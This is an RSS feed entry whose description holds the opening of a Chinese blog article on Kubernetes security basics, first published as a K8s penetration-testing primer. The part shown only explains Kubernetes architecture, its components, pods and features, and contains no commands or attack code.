      <link>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/kubernetes%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Wed, 01 Jan 2025 00:00:00 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/kubernetes%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</guid>
      <description>&lt;h1 id=&#34;kubernetes安全基础&#34;&gt;Kubernetes安全基础&lt;/h1&gt;&#xA;&lt;p&gt;文章首发于track安全社区：&lt;a href=&#34;https://bbs.zkaq.cn/t/32483.html&#34;&gt;K8s渗透入门从零到一&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;k8s基础&#34;&gt;k8s基础&lt;/h2&gt;&#xA;&lt;h3 id=&#34;k8s架构&#34;&gt;k8s架构&lt;/h3&gt;&#xA;&lt;p&gt;Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台&lt;/p&gt;&#xA;&lt;p&gt;k8s基本架构如下：&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1752397186606.png&#34; alt=&#34;QQ_1752397186606&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;master节点&lt;/strong&gt;主要有以下核心组件：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;etcd 保存了整个集群的状态&lt;/li&gt;&#xA;&lt;li&gt;API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制&lt;/li&gt;&#xA;&lt;li&gt;Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等&lt;/li&gt;&#xA;&lt;li&gt;Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;node节点&lt;/strong&gt;有以下核心组件：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源&lt;/p&gt;&#xA;&lt;p&gt;这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250713220938432.png&#34; alt=&#34;image-20250713220938432&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;k8s特点&#34;&gt;k8s特点&lt;/h3&gt;&#xA;&lt;p&gt;和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理&lt;/p&gt;&#xA;&lt;p&gt;k8s具有如下的特点：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;弹性伸缩：容器数量的控制&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;服务发现和负载均衡：默认方案&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;机密和配置管理：对敏感数据或其他进行配置管理&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;存储编排：虚拟磁盘与物理磁盘&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;批处理：批量任务实现&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;k8s工作流程&#34;&gt;k8s工作流程&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;kubectl 是 k8s 的客户端工具，可以使用命令行管理集群&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
